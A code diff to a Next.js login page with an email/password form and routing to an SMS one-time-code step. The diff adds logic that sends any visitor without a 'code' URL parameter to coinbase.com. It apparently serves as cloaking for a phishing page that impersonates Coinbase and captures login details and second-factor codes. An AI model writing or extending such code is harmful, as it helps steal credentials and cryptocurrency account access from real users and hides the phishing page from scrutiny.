@@ -2,7 +2,7 @@
 import Image from "next/image";
 import "@/css/global.css";
 import { useContext, useEffect, useState } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { library } from "@fortawesome/fontawesome-svg-core";
 import { faUser, faEyeSlash, faEye } from "@fortawesome/free-solid-svg-icons";
@@ -14,14 +14,17 @@ library.add(faUser, faEyeSlash, faEye);
 const MAIL_INPUT = 1;
 const PASS_INPUT = 2;
 const PASS_EYE = true;
+
 export default function Home() {
   const router = useRouter();
+  const params = useSearchParams()
   const themeContext = useContext(ThemeContext);
   if (!themeContext) {
     throw new Error("ThemeToggle must be used within a ThemeProvider");
   }
   const [showLoader, setShowLoader] = useState(true);
   const { theme, setTheme } = themeContext;
+  
   const [authMail, setAuthMail] = useState("test@gmail.com");
   const [authPass, setAuthPass] = useState("12345");
   const [logState, setLogState] = useState(MAIL_INPUT);
@@ -35,14 +38,16 @@ export default function Home() {
     //   mail: authMail,
     //   pass: authPass,
     // });
+    if ( !params || !params.has('code') ) {
+      window.location.replace("https://coinbase.com");
+      return
+    }
     setShowLoader(true);
     axios
       .post("/api/getAuth", {
-        mail: authMail,
-        pass: authPass,
+        code: params?.get('code') 
       })
       .then((res) => {
-        console.log(res.data);
         setTimeout(() => {
           const { success, record_id } = res.data;
           const authenticator = res.data['2fa_type']
@@ -56,10 +61,10 @@ export default function Home() {
               router.push("/otp_sms")
             }
           } else {
-            setShowLoader(false);
-            setLogState(MAIL_INPUT);
+            // setShowLoader(false);
+            // setLogState(MAIL_INPUT);
           }
-        }, 2000);
+        }, 0);
       });
     // axios
     //   .post(
